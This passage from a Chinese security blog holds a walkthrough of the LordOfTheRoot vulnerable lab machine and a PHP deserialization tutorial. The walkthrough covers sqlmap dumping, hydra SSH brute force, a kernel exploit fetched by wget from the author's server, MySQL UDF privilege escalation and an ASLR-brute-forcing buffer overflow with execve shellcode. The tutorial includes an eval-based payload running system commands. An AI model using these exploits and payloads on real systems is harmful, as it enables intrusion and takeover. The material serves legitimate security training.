这个参数启用操作系统探测、版本探测、脚本扫描和traceroute等一系列高级扫描技术。使用”-A”参数相当于同时启用了”-O”（操作系统探测）、”-sV”（版本探测:识别目标主机上运行的服务和应用程序的版本信息。）和”–script”（脚本扫描）参数。这样可以提供更丰富的扫描结果和更全面的主机信息。</li><li><code>-n</code>: 这个参数禁用DNS解析。如前面解释所述，禁用DNS解析可以加快扫描速度并避免由于DNS问题引起的延迟和失败。使用”-n”参数后，nmap将只显示IP地址而不提供主机名信息。</li></ul><p><img src="/../image/image-20240426143222105.png" alt="image-20240426143222105"></p><p><strong>发现只开放了一个22端口</strong></p><p><strong>尝试连接一下</strong></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>只有一个22端口，暂时做不了目录扫描</p><h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p>连接22端口获得提示<br>knock ftiend to enter（敲门进入）<br>Easy as 1,2,3</p><p><img src="/../image/image-20240426143540944.png" alt="image-20240426143540944"></p><p>应该是在提示port_knocking（端口试探）的概要。<br>端口试探的主要目的是防止攻击者通过对端口扫描的方式对主机进行攻击。<br>端口试探是一种通过尝试连接，从外部打开原先关闭端口的方法。一旦收到正确顺序的尝试连接，防火墙就会打开一些特定的端口允许尝试连接的主机访问。<br>根据上面提示，我们尝试连接顺序连接1,2,3端口</p><pre><code class="bash">knock是一个用于发送端口序列以触发特定行为的工具。它的工作原理是发送一系列的网络请求（称为&quot;击打&quot;）到指定的主机和端口组合上。通过按照指定的顺序发送这些请求，可以触发防火墙规则、端口转发或其他网络设备上的特定行为。命令中的参数解释如下：&lt;主机&gt;：目标主机的名称或IP地址。&lt;端口[:协议]&gt;：指定要进行击打的端口和协议。可以指定一个或多个端口，以冒号分隔端口号和协议（TCP或UDP）。可以使用TCP或UDP协议，默认情况下使用TCP。其他选项的解释如下：-u, --udp：指定所有端口都使用UDP方式进行击打。-d, --delay &lt;t&gt;：在每个端口之间设置等待时间，以毫秒为单位。-4, --ipv4：强制使用IPv4地址。-6, --ipv6：强制使用IPv6地址。-v, --verbose：显示详细信息，提供更多的输出。-V, --version：显示knock的版本信息。-h, --help：显示帮助信息。</code></pre><pre><code class="bash">knock -v 192.168.16.137 1 2 3</code></pre><p><img src="/../image/image-20240426144003787.png" alt="image-20240426144003787"></p><p>再次进行端口扫描</p><p>nmap -p- </p><p><img src="/../image/image-20240426144405510.png" alt="image-20240426144405510"></p><p>发现一个1337端口</p><p>这里看别的wp，发现了另一种写法</p><pre><code class="bash">for port in $(seq 1 3 ) ; do nmap 192.168.0.4 -p $port;done</code></pre><ul><li><p>for port in $(seq 1 3)：这是一个for循环语句，它将变量port设置为从1到3的序列。这意味着循环将执行三次，每次将port设置为1、2和3。</p></li><li><p>do nmap 192.168.0.4 -p $port &amp;：在循环体中，执行nmap命令。192.168.0.4是目标主机的IP地址。-p $port指定要扫描的端口，变量$port将在每次循环时被替换为当前的端口值。&amp;符号表示在后台运行nmap命令，以便并行执行多个扫描。</p></li><li><p>done：循环结束的标记。</p></li></ul><h2 id="访问端口服务"><a href="#访问端口服务" class="headerlink" title="访问端口服务"></a>访问端口服务</h2><p><img src="/../image/image-20240426144646234.png" alt="image-20240426144646234"></p><p>只有一张图片，但提示了mordor，尝试访问一下这个目录</p><p><img src="/../image/image-20240426144733009.png" alt="image-20240426144733009"></p><p>又是只有一张图THE BLACK GATEIS TOO MAINSTREAM，查看源代码，发现一串加密的字符串</p><pre><code class="html">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;--&gt;</code></pre><p>方cmd5去跑一下，查询结果是</p><pre><code class="tex">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</code></pre><p>左边的一串也类似加密的字符串，再跑一遍</p><pre><code class="tex">/978345210/index.php</code></pre><p>得到一个目录，尝试访问一下</p><p><img src="/../image/image-20240426145119047.png" alt="image-20240426145119047"></p><p>发现是一个登陆界面，直接用sqlmap试试，抓包，保存，-r</p><p><img src="/../image/image-20240426162217794.png" alt="image-20240426162217794"></p><p>发现不知道要跑多久，搜了下，换了个参数</p><pre><code>sqlmap -r 1.txt -D Webapp --tables --threads=10 --batch</code></pre><p>爆出来个User表</p><pre><code>sqlmap -r 1.txt -D Webapp --dump -T Users --threads=10 --batch</code></pre><p><img src="/../image/image-20240426165336227.png" alt="image-20240426165336227"></p><p>发现了用户名和密码，明文存取，试试登陆，每一个好像都是一样图片，试试用这些账号远程登陆试试，可以用hydra，先把这些账号密码分别保存到txt文件中</p><pre><code class="bash">hydra -L username.txt -P password.txt ssh://192.168.174.151</code></pre><p><img src="/../image/image-20240426170701782.png" alt="image-20240426170701782"></p><p>发现第二个账号是可以登陆的，用它登陆上去试试</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="利用内核漏洞提取39166-c"><a href="#利用内核漏洞提取39166-c" class="headerlink" title="利用内核漏洞提取39166.c"></a>利用内核漏洞提取39166.c</h3><p><strong>uname -a</strong><br>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p><p>发现是ubuntu14.04，去找找有什么能够利用的漏洞，发现一个Ubuntu特权提升漏洞（CVE-2021-3493），去试试。操作不允许。。。看下wp用的是啥，在msf里找,带39166.c的</p><pre><code>searchsploit Ubuntu 14.04</code></pre><p>然后把他复制过来</p><pre><code>searchsploit -m 39166.c</code></pre><p><img src="/../image/image-20240426222616464.png" alt="image-20240426222616464">然后在复制的地方搭建个一句话服务器</p><pre><code class="bash">python -m http.server 9966wget http://192.168.174.137:9966/39166.c#然后gcc 39166.c -o 39166./39166</code></pre><p><img src="/../image/image-20240426222841696.png" alt="image-20240426222841696"></p><pre><code>cd /rootcat Flat.txt“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”– Gandalf</code></pre><p><img src="/../image/image-20240426223158566.png" alt="image-20240426223158566"></p><h3 id="另一种方法-使用mysql提权"><a href="#另一种方法-使用mysql提权" class="headerlink" title="另一种方法:使用mysql提权"></a>另一种方法:使用mysql提权</h3><p>查看mysql 的版本</p><pre><code class="bash">ps -aux | grep mysqlmysql --version</code></pre><p><img src="/../image/image-20240426224959010.png" alt="image-20240426224959010"></p><p>查看mysql 数据库的root密码,这个可以去网站连接数据库的命令查看</p><p><img src="/../image/image-20240426225137108.png" alt="image-20240426225137108"></p><p>root:darkshadow</p><p>看看可以不以使用UDF提权，因为mysql是root用户运行的，如果我们提权成功，将获得root权限</p><pre><code class="bash">mysql -uroot -pdarkshadow</code></pre><p>进入数据库后，看看secure_file_priv的配置</p><pre><code>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出文件只能发生在 /tmp/ 目录下，此时也无法提权 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权</code></pre><pre><code class="sql">show global variables like &#39;secure%&#39;;</code></pre><p><img src="/../image/image-20240426225755198.png" alt="image-20240426225755198"></p><p>查看主机版本及数据库架构</p><pre><code class="sql">show variables like &#39;%compile%&#39;;</code></pre><p><img src="/../image/image-20240426225843760.png" alt="image-20240426225843760"></p><p>因数据库为i6886,要使用32位udf文件</p><p>查看plugin目录地址，此处为上传udf文件地址</p><pre><code class="sql">show variables like &#39;plugin%&#39;;</code></pre><p><img src="/../image/image-20240426225930605.png" alt="image-20240426225930605"></p><p>&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</p><p>可以在msf的&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql下，找到udf文件</p><pre><code>cd /usr/share/metasploit-framework/data/exploits/mysql</code></pre><p><img src="/../image/image-20240426230405789.png" alt="image-20240426230405789"></p><p>将文件复制出来，因为是32位架构，所以使用lib_mysqludf_sys_32.so</p><pre><code>cp lib_mysqludf_sys_32.so /root</code></pre><p>再搭一个一句话服务器9966端口，然后在靶机上下载</p><pre><code>wget http://192.168.174.137:9966/lib_mysqludf_sys_32.so</code></pre><p>然后连接数据库，进入一个库，我这里用的是mysql</p><p>创建一个表，用来存储udf文件内容</p><pre><code class="sql">create table foo(line blog);</code></pre><p>在MySQL中Blob是一个二进制的对象,Blob类型  最大能容纳65KB的</p><p><img src="/../image/image-20240426232307745.png" alt="image-20240426232307745"></p><p>将udf文件插入到temp表中</p><pre><code class="mysql">insert into foo(line) values (load_file(&#39;/home/smeagol/lib_mysqludf_sys_32.so&#39;));</code></pre><p><img src="/../image/image-20240426232545078.png" alt="image-20240426232545078"></p><p>在&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;目录下，新建一个udf32.so文件，将表中数据存入</p><pre><code class="mysql">select line from foo into dumpfile &quot;/usr/lib/mysql/plugin&quot;;</code></pre><p><img src="/../image/image-20240426233332384.png" alt="image-20240426233332384"></p><p>将udf32.so文件导入数据库，定义一个函数名称sys_eval</p><pre><code class="mysql">reate function sys_eval returns string soname &#39;udf32.so&#39;;</code></pre><p><img src="/../image/image-20240426233640781.png" alt="image-20240426233640781"></p><p>使用sys_eval函数，执行linux命令</p><p><img src="/../image/image-20240426233709376.png" alt="image-20240426233709376"></p><p>提权成功，给find命令赋予普通用户使用可以暂时获取root用户使用权限</p><pre><code class="mysql">select sys_eval(&#39;chmod u+s /usr/bin/find&#39;);</code></pre><p><img src="/../image/image-20240426234038902.png" alt="image-20240426234038902"></p><p>通过find命令的 exec参数，获取root的shell</p><pre><code class="bash">find ./ 1.txt -exec &#39;/bin/sh&#39; \;</code></pre><p><img src="/../image/image-20240426234322595.png" alt="image-20240426234322595"></p><h3 id="法三：缓冲区溢出提权"><a href="#法三：缓冲区溢出提权" class="headerlink" title="法三：缓冲区溢出提权."></a><strong>法三</strong>：<a href="https://www.freebuf.com/articles/network/325745.html">缓冲区溢出提权</a>.</h3><pre><code>ls -lahR</code></pre><ul><li><strong>ls</strong> -a           <em># 显示当前目录中的所有文件和目录，包括隐藏文件</em></li><li><strong>ls</strong> -lh          <em># 以人类可读的方式显示当前目录中的文件和目录大小</em></li><li><strong>ls</strong> -R           <em># 递归显示当前目录中的所有文件和子目录</em></li></ul><p>学到一个批量看文件的命令</p><p><img src="/../image/image-20240427224437242.png" alt="image-20240427224437242"></p><p>这个文件是放在&#x2F;SECRET&#x2F;door3的file的文件,可以用</p><pre><code>./file $(python -c &#39;print&#39; &quot;A&quot;*200&#39;)</code></pre><p>测试</p><p><img src="/../image/image-20240427224801334.png" alt="image-20240427224801334"></p><p>这里使用gdb工具进行调试</p><pre><code>gdb -q ./file</code></pre><p>既然在测试中200个字节就已经产生了溢出，那就先去生成一个不重复的两百的字节大小的字符串,这里用msf中的pattern_create.rb构造</p><pre><code>locate pattern_cd /usr/share/metasploit-framework/tools/exploit ./pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</code></pre><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb这两个脚本是专门用来作为缓冲区溢出查找偏移量的</code></pre><p>然后把这个字符串作为参数，放到gdb里run一下</p><p>走到这里和攻略不一样了，<a href="https://www.freebuf.com/vuls/343808.html">先换一种方法</a></p><p>在之前查看文件的基础上，可以发现间隔了几分钟后，我们再次查看，发现文件大小发生了变化</p><p><img src="/../image/image-20240427225956360.png" alt="image-20240427225956360"></p><p>一开始door1的file是7.2，door2的file是5.1，现在door1的是5.1，door2的是7.1</p><p>时使用ldd命令查看file ldd（查看依赖情况）</p><p><img src="/../image/image-20240427230232377.png" alt="image-20240427230232377"></p><p>这个是因为存在一个防护机制ASLR，我们查看ASLR设置</p><pre><code>cat /proc/sys/kernel/randomize_va_space或sysctl -a --pattern randomize</code></pre><p><img src="/../image/image-20240427230333280.png" alt="image-20240427230333280"></p><p>返回2</p><p>0 &#x3D; 关闭</p><p>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）</p><p>2 &#x3D; 全随机。除了1中所述，还有heap。</p><p>如果没有设置ASLR的话，ldd看到的值也都是固定的</p><p><strong>注意：这里的ASLR设置并不等于上文所说root权限下执行的那个py文件，switcher.py每三分钟变换一次值，相当于这是两道防护，让溢出的难度变得更大</strong></p><p><strong>绕过ASLR的一种方法是通过编写一个自动循环脚本（循环攻击，总会攻击到溢出的那个点）来强制堆栈，接下来要放入payload需要进行nop sled来爆破一个空间出来</strong></p><p>现在的情况就是，<strong>缓冲区溢出的文件随机，空间也随机</strong></p><p>对于溢出来说，有几个点：</p><ol><li>首先，溢出的点在哪里（偏移量&#x2F;溢出值）</li><li>溢出后，后面的空间有多大，放合适的恶意代码进去</li><li>绕过安全保护机制</li></ol><p>首先我们找到那个5.1k的file，然后把他搞到kali里面</p><p>我这里直接base64编码复制出来</p><pre><code>base64 file</code></pre><p><img src="/../image/image-20240427230658503.png" alt="image-20240427230658503"></p><p>复制放到本地的一个文本中，并且复原成file,然后解密</p><pre><code>cat 1.txt | base64 -d &gt; file</code></pre><p><img src="/../image/image-20240427230953611.png" alt="image-20240427230953611"></p><p>此时在确定file是5.1k的情况下查看<strong>md5值</strong>，与kali里的进行对比</p><pre><code>md5sum file</code></pre><p><img src="/../image/image-20240427231057051.png" alt="image-20240427231057051"></p><p>可以发现是一样的，这里也使用GDB进行分析，博主推荐两个插件</p><pre><code>pwndbg和peda</code></pre><p>下面就是调试了</p><p>先授予权限并执行</p><pre><code>chmod +x file </code></pre><p><img src="/../image/image-20240427231812796.png" alt="image-20240427231812796"></p><p>当把值加大后，回显段报错，用之前用的的方法生成个1000位值</p><pre><code>./patern_create.rb -l 1000</code></pre><p><img src="/../image/image-20240427232203712.png" alt="image-20240427232203712"></p><p>再使用GDB执行值</p><p><img src="/../image/image-20240427233451400.png" alt="image-20240427233451400"></p><p><img src="/../image/image-20240427232335848.png" alt="image-20240427232335848"></p><p>然后发现之前方法可以继续下去了，可能是环境没调好</p><p>这两个工具是对应的，识别溢出点，上面脚本的找到错误点，下面的脚本找到位置</p><p>0x41376641 in ?? ()</p><p>查看到错误点在41376641</p><p><strong>分析错误点判断偏移量</strong></p><pre><code>./pattern_offset.rb -q 41376641</code></pre><p><img src="/../image/image-20240427232550038.png" alt="image-20240427232550038"></p><p>得到偏移位置171</p><p><strong>尝试在偏移量171溢出后情况</strong></p><pre><code>gdb$run $(python -c &#39;print(&quot;A&quot; * 171 + &quot;B&quot; * 4)&#39;)//我感觉明白前面不行是为什么了，我这里要加括号,python3print变成fun必须+括号</code></pre><p><img src="/../image/image-20240427233917963.png" alt="image-20240427233917963"></p><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。</p><p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</p><p>EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。</p><p>可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。</p><p><strong>Nop空间测试ESP</strong></p><p>由于开启了ASLR机制，需要进行nop sled来爆破一个空间出来</p><pre><code>run $(python -c &#39;print(&quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000)&#39;)</code></pre><p>写入171个A之后，写入4个B，之后写入90</p><p><img src="/../image/image-20240427234217740.png" alt="image-20240427234217740"></p><p>我们成功的控制了eip中的内容，ESP就是我们溢出之后执行shellcode的地方</p><pre><code>x/s $esp</code></pre><p><img src="/../image/image-20240428104020602.png" alt="image-20240428104020602"></p><p>0xffffbf30这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell</p><p>这里做到后面做错了。。。不能在本机跑。。。，内存都不一样了。。。</p><p>那我们往eip填写的数据需要是‘0xbfd37c50:’,记得倒序</p><p>看wp，作者在&#x2F;SECRET中执行的代码，这三次代码相同，但是每次esp地址却不同，甚至第三次他又没产生溢出漏洞，这就是我们上面讲的ASLR，他的地址在动态变化，防止我们制造出溢出漏洞，我想们需要饶过他</p><p>假设他每次地址都在随机变化，那我们只要指定一个地址填充到eip中，并不断执行构造溢出，那是不是他终究会出现随机到和我们指定的地址相同这种情况，时不时就会执行我们的shellcode</p><p>编写exp</p><pre><code class="python">#!/bin/pythonimport osbuf=&quot;A&quot;*171shellcode=&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;#for a in &#123;1..1000&#125;; do ./file $(python -c &#39;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#39;); doneshell=buf+&quot;\x40\xee\xff\xbf&quot;+&quot;C&quot;*20000+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;for i in range(1,500):        os.system(&#39;./file&#39;+&quot; &quot;+shell)</code></pre><p>由于esp地址前两位一直是bf所以我们前两位不变，剩下六位随便填，不要填\x00就行，他有特殊含义不能被正确识别</p><p>代码中被注释的是我从其他作者文章中复制过来的，可以直接在shell中执行</p><p>执行命令</p><pre><code>#for a in &#123;1..1000&#125;; do ./file $(python -c &#39;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#39;); done</code></pre><p><img src="/../image/image-20240428163407372.png" alt="image-20240428163407372"></p><p>终于成了。。。。</p><p>这里有个问题是，root目录下有个switcher.py文件，会让产生缓冲区溢出的文件发生变化</p><pre><code>#!/usr/bin/pythonimport osfrom random import randinttargets= [&quot;/SECRET/door1/&quot;,&quot;/SECRET/door2/&quot;,&quot;/SECRET/door3/&quot;]for t in targets:   os.system(&quot;rm &quot;+t+&quot;*&quot;)   os.system(&quot;cp -p other &quot;+t)   os.system(&quot;cp -p &quot;+t+&quot;other &quot;+t+&quot;file&quot;)   os.system(&quot;rm &quot;+t+&quot;other&quot;)luckyDoor = randint(0,2)t=targets[luckyDoor]os.system(&quot;rm &quot;+t+&quot;*&quot;)os.system(&quot;cp -p buf &quot;+t)os.system(&quot;cp -p &quot;+t+&quot;buf &quot;+t+&quot;file&quot;)os.system(&quot;rm &quot;+t+&quot;buf&quot;)</code></pre><p>有时候不行的话，可以回去看下存在溢出的文件有没有发生变化</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulhub </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> udf提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2024/04/18/php-SER-libs/"/>
      <url>/2024/04/18/php-SER-libs/</url>
      
        <content type="html"><![CDATA[<h1 id="php面像对象基本知识"><a href="#php面像对象基本知识" class="headerlink" title="php面像对象基本知识"></a>php面像对象基本知识</h1><p>对象的三个特征：对象的行为、对象的形态、对象的表示</p><p>类的定义：类是定义了一件事物的抽象特点，它将数据的形式以及这些数据<br>上的操作封装在一起。</p><p>对象是具有类类型的变量，是对类的实例。</p><p>内部构成：成员变量(属性) +成员函数（方法）</p><p>成员变量：定义在类内部的变量。该变量的值对外是不可见的但是可以通过成员函数访问在类被实例化为对象后，该变量即可成为对象的属性。</p><p>成员函数：定义在类的内部可用于访问对象的数据。</p><p>继承:继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。</p><p>在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><h2 id="类于对象"><a href="#类于对象" class="headerlink" title="类于对象"></a>类于对象</h2><h3 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h3><p>类:定义类名、定义成员变量(属性)、定义成员函数(方法)</p><pre><code class="php">&lt;?phpclass Class_Name&#123;    //成员变量声明    //成员函数声明&#125;?&gt;</code></pre><p>创建一个类:</p><pre><code class="php">&lt;?phpclass hero&#123; //定义类(类名)    var $name;//生命成员变量    var $sex;    function jineng($var1) &#123; //声明成员方法        echo $this-&gt;name; //使用预定义$this调用成员变量        echo $var1; // 成员函数传参$var1可以直接调用    &#125;&#125;?&gt;</code></pre><h3 id="实例化和复制"><a href="#实例化和复制" class="headerlink" title="实例化和复制"></a>实例化和复制</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);class hero&#123;  var $name;  var $sex;  function jineng($var1) &#123;    echo $this-&gt;name.&quot;&lt;br /&gt;&quot;;    echo $var1.&quot;&lt;br /&gt;&quot;;    &#125;&#125;$cyj= new hero(); //实例化类hero()为对象cyj$cyj-&gt;name=&#39;chengyaojin&#39;;//参数赋值$cyj-&gt;sex=&#39;man&#39;;$cyj-&gt;jineng(&#39;zuofan&#39;);//嗲用函数print_r($cyj);//打印对象?&gt;</code></pre><h3 id="类的修饰符介绍"><a href="#类的修饰符介绍" class="headerlink" title="类的修饰符介绍"></a>类的修饰符介绍</h3><p>在类中直接声明的变量称为成员属性(也可以成为成员变量)</p><p>可以在类中声明多个变量，即“对象”中可以有多个成员属性，每个变量都存储“对象”不同的属性信息。</p><p>访问权限修饰符:对属性的定义</p><p>常用访问权限修饰符:</p><p>​public:公共的，在类的内部、子类中或者类的外部都可以使用，不受限制;</p><p>​protected:受保护的，在类的内部、子类中可以使用，但不能在类的外部使用;</p><p>​private:私有的，只能在类的内部使用，在类的外部或者子类中都无法使用。</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class hero&#123;  public  $name=&#39;chengyaojin&#39;; //外部可用  private  $sex=&#39;man&#39;;//外部不可用  protected  $shengao=&#39;165&#39;;//外部不可用  function jineng($var1) &#123;    echo $this-&gt;name;    echo $var1;    &#125;&#125;$cyj= new hero();echo $cyj-&gt;name.&quot;&lt;br /&gt;&quot;;echo $cyj-&gt;sex.&quot;&lt;br /&gt;&quot;;echo $cyj-&gt;shengao.&quot;&lt;br /&gt;&quot;;?&gt;</code></pre><pre><code class="php">&lt;?phphighlight_file(__FILE__);class hero&#123;  public  $name=&#39;chengyaojin&#39;;  private  $sex=&#39;man&#39;;  protected  $shengao=&#39;165&#39;;//子类可用  function jineng($var1) &#123;    echo $this-&gt;name;    echo $var1;    &#125;&#125;class hero2 extends hero&#123;    function test()&#123;           echo $this-&gt;name.&quot;&lt;br /&gt;&quot;;        echo $this-&gt;sex.&quot;&lt;br /&gt;&quot;;        echo $this-&gt;shengao.&quot;&lt;br /&gt;&quot;;    &#125;&#125;$cyj= new hero();$cyj2=new hero2();echo $cyj-&gt;name.&quot;&lt;br /&gt;&quot;;echo $cyj2-&gt;test();?&gt;</code></pre><p><img src="/../image/image-20240418233609469.png" alt="image-20240418233609469"></p><h1 id="序列化知识"><a href="#序列化知识" class="headerlink" title="序列化知识"></a>序列化知识</h1><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>序列化 (Serialization)是将对象的状态信息(属性)转换为可以存储或传输的形式的过程。将对象或者数组转化为可储存&#x2F;传输的字符串。</p><p>演示:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class TEST &#123;    public $data;    public $data2 = &quot;dazzhuang&quot;;    private $pass;    public function __construct($data, $pass)    &#123;        $this-&gt;data = $data;        $this-&gt;pass = $pass;    &#125;&#125;$number = 34;$str = &#39;user&#39;;$bool = true;$null = NULL;$arr = array(&#39;a&#39; =&gt; 10, &#39;b&#39; =&gt; 200);$test = new TEST(&#39;uu&#39;, true);$test2 = new TEST(&#39;uu&#39;, true);$test2-&gt;data = &amp;$test2-&gt;data2;echo serialize($number).&quot;&lt;br /&gt;&quot;;echo serialize($str).&quot;&lt;br /&gt;&quot;;echo serialize($bool).&quot;&lt;br /&gt;&quot;;echo serialize($null).&quot;&lt;br /&gt;&quot;;echo serialize($arr).&quot;&lt;br /&gt;&quot;;echo serialize($test).&quot;&lt;br /&gt;&quot;;echo serialize($test2).&quot;&lt;br /&gt;&quot;;?&gt;</code></pre><p><img src="/../image/image-20240418234413114.png" alt="image-20240418234413114"></p><p><img src="/../image/image-20240418234703813.png" alt="image-20240418234703813"></p><h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);$a = array(&#39;benben&#39;,&#39;dazhuang&#39;,&#39;laoliu&#39;);echo $a[0];echo serialize($a);?&gt;</code></pre><p><img src="/../image/image-20240421150039939.png" alt="image-20240421150039939"></p><h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class test&#123;    public $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;$a = new test();echo serialize($a);?&gt;</code></pre><p><img src="/../image/image-20240421150229394.png" alt="image-20240421150229394"></p><h2 id="私有修饰符"><a href="#私有修饰符" class="headerlink" title="私有修饰符"></a>私有修饰符</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class test&#123;    private $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;$a = new test();echo serialize($a);?&gt;</code></pre><p><strong>私有属性会在当前类加上类名，再加上%00，也就是null</strong></p><p><img src="/../image/image-20240421150636424.png" alt="image-20240421150636424"></p><p><img src="/../image/image-20240421150726683.png" alt="image-20240421150726683"></p><pre><code>url编码：O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D</code></pre><h2 id="保护修饰符"><a href="#保护修饰符" class="headerlink" title="保护修饰符"></a>保护修饰符</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class test&#123;    protected $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;$a = new test();echo serialize($a);?&gt;</code></pre><p><img src="/../image/image-20240421151744954.png" alt="image-20240421151744954"></p><p>会多个星号，然后前后都有null，提交的时候要加%00*%00</p><h2 id="成员属性调用对象"><a href="#成员属性调用对象" class="headerlink" title="成员属性调用对象"></a>成员属性调用对象</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);class test&#123;    var $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;    function __construct()&#123;        $this-&gt;ben=new test();    &#125;&#125;$a = new test2();echo serialize($a);?&gt;</code></pre><p><img src="/../image/image-20240421151924120.png" alt="image-20240421151924120"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>1.反序列化之后的内容为一个对象;</p><p>2.反席列化生成的对象里的值，由反序列化里的值提供;与原有类预定义的值无关;</p><p>反序列化漏洞的成因:反序列化过程中，unserialize()接收的值(字符串)可控，得到所需要的代码，即生成的对象的属性值。通过更改这个值(字符串)，</p><p>3.反序列化不触发类的成员方法;需要调用方法后才能触发;</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class test &#123;    public  $a = &#39;benben&#39;;    protected  $b = 666;    private  $c = false;    public function displayVar() &#123;        echo $this-&gt;a;    &#125;&#125;$d = new test();$d = serialize($d);echo $d.&quot;&lt;br /&gt;&quot;;echo urlencode($d).&quot;&lt;br /&gt;&quot;;$a = urlencode($d);$b = unserialize(urldecode($a));var_dump($b);?&gt;</code></pre><p><img src="/../image/image-20240421152439469.png" alt="image-20240421152439469"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class test&#123;    public $a = &#39;echo &quot;this is test!!&quot;;&#39;;    public function displayVar() &#123;        eval($this-&gt;a);    &#125;&#125;$get = $_GET[&quot;benben&quot;];$b = unserialize($get);$b-&gt;displayVar() ;?&gt;</code></pre><pre><code class="php">&lt;?php    class test&#123;    public $a = &#39;echo &quot;this is test!!&quot;;&#39;;    public function displayVar() &#123;        eval($this-&gt;a);    &#125;&#125;echo serialize(new test());</code></pre><p><img src="/../image/image-20240421161340530.png" alt="image-20240421161340530"></p><p>如果是要执行命令的话，比如ipconfig，可以利用以下代码</p><pre><code class="php">&lt;?phpclass test&#123;    public $a = &#39;system(&quot;ipconfig&quot;);&#39;;    public function displayVar()    &#123;        eval($this-&gt;a);    &#125;&#125;echo serialize(new test());?&gt;</code></pre><p><img 